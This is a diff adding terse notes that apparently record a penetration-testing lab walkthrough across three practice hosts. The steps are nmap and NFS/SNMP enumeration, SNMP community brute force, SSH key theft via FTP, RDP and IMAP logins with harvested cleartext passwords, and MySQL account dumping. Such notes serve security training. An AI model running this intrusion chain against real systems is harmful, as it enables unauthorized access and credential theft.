@@ -1,0 +1,52 @@
+1. 
+
+sudo nmap -sC -sV 10.129.42.195 -oA 1/part1_scan
+
+sudo ftp 10.129.42.195 2121
+
+	logged in
+	downloaded contents in ssh folder
+
+ssh -i ./id_rsa ceil@10.129.42.195
+
+2.
+sudo nmap -sC -sV 10.129.202.41 -oA 2/part2_scan
+
+sudo nmap --script nfs* 10.129.202.41 -sV -p111,2049
+
+showmount -e 10.129.202.41
+mount -t nfs 10.129.202.41:/TechSupport ./target-NFS/ -o nolock
+
+- read files in the mount and saw credentials to a user alex
+
+xfreerdp /u:alex /p:"lol123!mD" /v:10.129.202.41
+Commands on the windows machine:
+	C:\Users\alex>where /R C:\Users *imp*
+	C:\Users\alex>type C:\Users\alex\devshare\important.txt
+
+
+xfreerdp /u:Administrator /p:"87N1ns@slls83" /v:10.129.202.41
+looked at the accounts table for the mssql database
+
+
+3. 
+
+sudo nmap -sC -sV 10.129.202.20
+sudo nmap -sV --top-port 100 -sU 10.129.202.20
+
+brute force community strings for snmp protocol:
+onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
+
+get oids:
+snmpwalk -v2c -c backup 10.129.202.20
+	found this: tom NMds732Js2761
+
+Login as tom to imaps:
+openssl s_client -connect 10.129.202.20:imaps
+1 LOGIN tom NMds732Js2761
+
+got private key from mail
+ssh -i ./key tom@10.129.202.20
+mysql -u tom -p
+
+use mysql to look at the accounts and their passwords
